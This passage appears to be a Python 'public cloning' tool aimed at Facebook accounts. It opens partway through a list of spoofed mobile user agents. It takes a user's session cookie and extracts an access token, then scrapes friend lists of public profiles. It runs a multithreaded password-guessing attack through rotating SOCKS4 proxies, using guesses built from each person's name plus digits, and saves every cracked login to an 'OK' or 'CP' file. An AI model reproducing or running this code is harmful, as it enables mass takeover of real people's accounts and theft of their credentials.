"Mozilla/5.0 (Linux; Android 7.0; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.3.3606.65458",
"Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [ip:193.207.177.169]",
"Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [ip:151.38.134.181]",
"Mozilla/5.0 (Linux; Android 7.0; VIE-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.46.5.92]",
"Mozilla/5.0 (Linux; Android 12; CPH2207 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.2.3606.65175 [ip:185.82.168.15]",
"Dalvik/2.1.0 (Linux; U; Android 11; MiTV-AYFR0 Build/RTT0.211222.001)",
"Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:151.47.80.176]",
"Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; K5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Dalvik/2.1.0 (Linux; U; Android 10; Orange Neva leaf Build/QP1A.190711.020)",
"Mozilla/5.0 (Linux; Android 10; Nokia 7 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:185.212.69.203]",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [ip:37.162.85.147]",
"Mozilla/5.0 (Linux; Android 10; ART-L29; HMSCore 6.5.1.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.4.306 Mobile Safari/537.36 [ip:37.161.163.238]",
"samsung/SM-A325F (Linux;Android 12)",
"Mozilla/5.0 (Linux; Android 10; LM-K410) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36 [ip:37.163.26.220]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 mailapp/6.2.9",
"Mozilla/5.0 (Linux; Android 6.0; iQ1452a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; H8216) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:93.36.181.34]",
"Mozilla/5.0 (Linux; Android 11; 21061110AG Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 12; 6102H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; ja_jp)",
"Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36 [ip:176.200.158.21]",
"Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36 [ip:80.182.147.126]",
"Mozilla/5.0 (Linux; Android 11; CPH2135 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 241.1.0.18.114 Android (30/11; 320dpi; 720x1440; OPPO; CPH2135; OP4EFDL1; qcom; it_IT; 379517353)",
"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L22 Build/HUAWEIRNE-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G160N Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CPH2135) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:79.21.142.104]",
"Mozilla/5.0 (Linux; U; Android 11; SM-A025F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 OPR/63.0.2254.62069",
"Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:2.199.59.131]",
"Mozilla/5.0 (Linux; Android 11; T775H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Lenovo TB-X704L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:176.200.2.198]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5] [ip:77.32.59.126]",
"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.36.6.229]",
"Mozilla/5.0 (Linux; Android 9; FIG-LX1; HMSCore 6.5.1.301; GMSCore 22.24.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.4.306 Mobile Safari/537.36",
"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
"Dalvik/1.6.0 (Linux; U; Android 4; IY05 Build/UC8LCTY)[FBAN/FB4A;FBAV/230.5.1.76;FBBV/67820085;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/67820085;FBCR/PosteMobile;FBMF/oppo;FBPN/com.facebook.katana;FBDV/tecno;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Symbian/3; Series60/8.8 Nokia3969/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.2.2 Mobile Safari/535.1",
])

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	exit(e)
	print(' [+] MAHADI-143')
prox=open('.prox.txt','r').read().splitlines()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
try:
	os.system('curl https://raw.githubusercontent.com/MAHADI-143/MULTI-FB/main/socks4.txt -o socks4.txt')
except:
	pass
sock=open('socks4.txt','r').read().splitlines()
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/fff-00/bbnew/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
try:
	os.system('clear')
	xnx = ses.get('https://raw.githubusercontent.com/MAHADI-143/MULTI-FB/main/M.txt').text
	if "maintenance" in xnx:
		os.system('clear')
		print('tool is under maintenance break')
		sys.exit()
	if "off" in xnx:
		print('Tool is Currenty Off')
		sys.exit()
	if "update" in xnx:
		print('Tool is updating..... Wait For Complete The Update')
		sys.exit()
	if "server" in xnx:
		print('server is closed')
		sys.exit()
except requests.exceptions.ConnectionError:
	print("FIX YOUR INTERNET BRUH")
	sys.exit()

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()

#------------[ WARNA-COLOR ]--------------#
### WARNA RANDOM ###
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()

#LOGO
jsn =input('\033[1;91m[•] \033[1;93mWHAT IS YOUR NAME : ')
def banner():
	clear()
	print("""
	
\033[1;92m ███    ███ \033[1;94m █████ \033[1;93m ██   ██ \033[1;91m █████ \033[1;95m ██████ \033[1;96m ██ 
\033[1;92m ████  ████\033[1;94m ██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;95m ██   ██ \033[1;96m██ 
\033[1;92m ██ ████ ██\033[1;94m ███████\033[1;93m ███████\033[1;91m ███████\033[1;95m ██   ██\033[1;96m ██ 
\033[1;92m ██  ██  ██\033[1;94m ██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;95m ██   ██\033[1;96m ██ 
\033[1;92m ██      ██\033[1;94m ██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;95m ██████ \033[1;96m ██ 
\033[1;92m ╔════════════════════════════════════════════╗\033[1;92m
\033[1;92m ║\033[1;97m\033[1;41m           FREE PUBLIC CLONING V4           \033[1;0m\033[1;92m║\033[1;92m
\033[1;92m ╚════════════════════════════════════════════╝\033[1;92m
\033[1;92m ╔════════════════════════════════════════════╗\033[1;92m
\033[1;92m ║➣ \033[1;91mDEVOLPER   :          MAHADI HASAN AFRIDI \033[1;92m║
\033[1;92m ║➣ \033[1;92mFACEBOOK   :          MAHADI HASAN AFRIDI \033[1;92m║
\033[1;92m ║➣ \033[1;93mWHATSAPP   :          01794315166 \033[1;92m        ║
\033[1;92m ║➣ \033[1;94mGITHUB     :          MAHADI-143\033[1;92m          ║
\033[1;92m ║➣ \033[1;95mTOOLS      :          PUBLIC CLONING     \033[1;92m ║
\033[1;92m ╚════════════════════════════════════════════╝""")
#LOGIN
def login_main():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cookie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(' \033[1;91m[•] PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	os.system('clear')
	banner()
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	cookie=input(f' [•] ENTER COOKIES :{warna} ')
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cookie.txt", "w").write(cookie)
		print(f'\033[1;92m [•] LOGIN DONE ');time.sleep(1)
		os.system('python3 MULTI-FB.py')
		exit()
	except Exception as e:
		os.system("rm -rf .token.txt")
		os.system("rm -rf .cookie.txt")
		print(f' %s[%sx%s]%s LOGIN FAILED%s'%(x,k,x,m,x))
		os.system('python3 MULTI-FB.py')
		exit()

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cookie.txt','r').read()
	except IOError:
		print('\033[1;91m [×] COOKIES EXPIRED ')
		os.system('python3 MULTI-FB.py')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(" ┏━\033[1;97m[A] \033[1;92mCRACK FROM PUBLIC ID")
	print(" ┣━\033[1;97m[B] \033[1;92mCONTACT ADMIN")
	print(" ┣━\033[1;97m[E] \033[1;92mEXIT [LOG OUT COOKIES]")
	jh=input(' ┗━%s[%s+%s] SELECT : '%(N,K,N))
	if jh == '':
		jh(' \n%s[%s#%s] SELECT INVILD'%(N,M,N));time.sleep(2);menu()
	if jh in ['A']:
		multicrack()
	elif jh in ['B']:
		os.system('xdg-open https://www.facebook.com/4FR1D1.143')
		os.system('python3 MULTI-FB.py')
	elif jh in ['E']:
		print("")
		titik = [' \x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
		for x in titik:
			sys.stdout.write(' \r ┏━%s[%s!%s] DELETE COOKIE %s'%(N,M,N,x)); sys.stdout.flush()
			time.sleep(1)
		os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
		jalan(' \n ┗━%s[%s+%s] %sSUCCESSFULLY DELETE COOKIE '%(N,H,N,H))
		os.system('python3 MULTI-FB.py')
	else:
		jalan(' \n %s[%sX%s] INPUT WRONG [%s%s%s]...'%(N,M,N,M,jh,N));time.sleep(1);menu(my_name,my_id)
		back()
#-------------------[ CRACK-PUBLIC ]----------------#
def multicrack():
	try:
		cok= open('.cookie.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		nanya_keun = 2
	except:nanya_keun=10000
	for mnh in range(nanya_keun):
		mnh +=1
		pil = input('\033[1;92m ┣━%s[%s•%s] ENTER PUBLIC ID USER %s%s%s: %s'%(N,K,N,H,mnh,N,H))
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
		except requests.exceptions.ConnectionError:
			print(f" {BM}  BAD CONNECTION !!{N}")
		except (KeyError,IOError):
			jalan(f' ┗━%s[%s•%s] SORRY %sID NOT PUBLIC%s'%(N,M,N,M,N));time.sleep(1);multicrack()()
	print(P+'\033[1;92m ┗━['+H+'•'+P+'] TOTAL ID : '+str(len(id)))
	setting()

def setting():
	os.system('clear')
	banner()
	print('\033[1;92m ┏━[A] \033[1;93mCRACK WITH AUTO PASSWORD')
	print('\033[1;92m ┣━[B] \033[1;93mCRACK WITH NAME+DIGIT PASSWORD')
	hu = input(N+'\033[1;92m ┗━['+M+'+'+N+'] SELECT : ')
	if hu in ['0','00']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['a','A']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['b','B']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	method.append('mobile')
	passwrd()

def passwrd():
	os.system('clear')
	banner()
	print('\033[1;92m ┏━[•] \033[1;91mUSER NAME \033[1;97m: '+jsn)
	print(f'\033[1;92m ┣━[•] \033[1;93mTOTAL ID : {h}'+str(len(id)))
	print("\033[1;92m ┣━[•] \033[1;94mRE-LOGIN CP ID 15 DAYS")
	print("\033[1;92m ┗━[•] \033[1;97mTRUN ON AIRPLANE MODE 5 SECONDS")
	print("\033[1;92m ══════════════════════════════════════════════")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','kolaka','kendari','anjing','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			else:
				print("")
	input("\n \033[1;92m┏━[•] CRACK PROCESS SUCCESSFUL \n ┗━[•] BACK ")
	back()
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r\33[92m [SCANNING]{P}[{k}{loop}{P}/{h}{len(id)}{P}][OK:{P}{H}{ok}{P}][CP{P}:{m}{cp}{x}]")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\33[90m [MAHADI-CP]{idf}|{pw}')
				open('CP/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\33[92m [MAHADI-OK]{idf}|{pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1
#--------------------[ MAHADI ]-----------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('MULTI-FB')
	except:pass
	login_main()

